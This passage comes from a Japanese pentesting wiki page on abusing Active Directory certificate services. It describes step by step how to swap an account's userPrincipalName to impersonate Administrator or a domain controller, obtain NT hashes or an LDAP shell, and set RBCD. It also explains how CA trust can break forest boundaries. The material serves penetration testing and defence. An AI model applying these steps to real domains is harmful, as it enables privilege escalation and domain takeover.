次に、クライアント認証を許可する任意の証明書をリクエストします。例えばデフォルトの `User` テンプレートです。証明書は `Jane` としてリクエストする必要があります。

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

証明書の `userPrincipalName` が `Administrator` であることに注意してください。

その後、`Jane` の `userPrincipalName` を元の `userPrincipalName` である `Jane@corp.local` などに戻します。

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

今、証明書で認証を試みると、`Administrator@corp.local` ユーザーのNTハッシュを受け取ります。証明書にドメインが指定されていないため、コマンドラインに `-domain <domain>` を追加する必要があります。

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### 悪用ケース2

* `CertificateMappingMethods` に `UPN` ビットフラグ (`0x4`) が含まれている
* `userPrincipalName` プロパティを持たない任意のアカウントAに対する `GenericWrite` 権限を持っていて、アカウントBを侵害する（マシンアカウントや組み込みドメイン管理者 `Administrator`）

このケースでは、`John@corp.local` は `Jane@corp.local` に対する `GenericWrite` 権限を持っており、ドメインコントローラー `DC$@corp.local` を侵害したいと考えています。

まず、例えばShadow Credentialsを使用して（`GenericWrite` を使用して）、`Jane` のハッシュを取得します。

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>

次に、`Jane` の `userPrincipalName` を `DC$@corp.local` に変更します。

<figure><img src="../../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

これは制約違反ではありません。なぜなら `DC$` コンピュータアカウントは `userPrincipalName` を持っていないからです。

次に、クライアント認証を許可する任意の証明書をリクエストします。例えばデフォルトの `User` テンプレートです。証明書は `Jane` としてリクエストする必要があります。

<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>

その後、`Jane` の `userPrincipalName` を元の `userPrincipalName` である `Jane@corp.local` などに戻します。

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

今、このレジストリキーはSchannelに適用されるため、Schannel経由で認証に証明書を使用する必要があります。ここでCertipyの新しい `-ldap-shell` オプションが登場します。

証明書と `-ldap-shell` を使用して認証を試みると、`u:CORP\DC$` として認証されていることがわかります。これはサーバーによって送信される文字列です。

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

LDAPシェルで利用可能なコマンドの1つは `set_rbcd` で、これはターゲットにリソースベースの制約付き委任（RBCD）を設定します。したがって、ドメインコントローラーを侵害するためにRBCD攻撃を実行することができます。

<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

または、`userPrincipalName` が設定されていない、または `userPrincipalName` がそのアカウントの `sAMAccountName` と一致しない任意のユーザーアカウントを侵害することもできます。私自身のテストでは、デフォルトのドメイン管理者 `Administrator@corp.local` はデフォルトで `userPrincipalName` が設定されておらず、このアカウントはデフォルトでLDAPでドメインコントローラーよりも多くの権限を持っているはずです。

## 証明書を使用したフォレストの侵害

### CAの信頼がフォレストの信頼を破る

**クロスフォレスト登録**の設定は比較的シンプルです。管理者はリソースフォレストからの**ルートCA証明書**をアカウントフォレストに公開し、リソースフォレストの**エンタープライズCA**証明書を各アカウントフォレストの**`NTAuthCertificates`**およびAIAコンテナに追加します。明確にするために、これはリソースフォレストの**CA**がPKIを管理する**他のすべてのフォレスト**に対して**完全な制御**を持っていることを意味します。攻撃者がこのCAを**侵害する**と、リソースフォレストとアカウントフォレストのすべてのユーザーの証明書を**偽造**し、フォレストのセキュリティ境界を破ることができます。

### 登録権限を持つ外国のプリンシパル

多フォレスト環境では、エンタープライズCAが**認証されたユーザーや外国のプリンシパル**（エンタープライズCAが属するフォレスト外のユーザー/グループ）に**登録および編集権限**を付与する証明書テンプレートを公開することにも注意が必要です。\
信頼を越えてアカウントが**認証される**と、ADは認証ユーザーのトークンに**認証されたユーザーSID**を追加します。したがって、テンプレートが**認証されたユーザーに登録権限を付与する**エンタープライズCAを持つドメインがある場合、異なるフォレストのユーザーがテンプレートに**登録する可能性**があります。同様に、テンプレートが**外国のプリンシパルに登録権限を明示的に付与する**場合、**クロスフォレストのアクセス制御関係**が作成され、あるフォレストのプリンシパルが別のフォレストのテンプレートに**登録する**ことを許可します。

最終的に、これらのシナリオはどちらも一方のフォレストから他方への攻撃面を**増加させます**。証明書テンプレートの設定によっては、攻撃者がこれを悪用して外国のドメインで追加の権限を得る可能性があります。

## 参考文献

* このページの情報はすべて [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf) から取得されました

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong></a
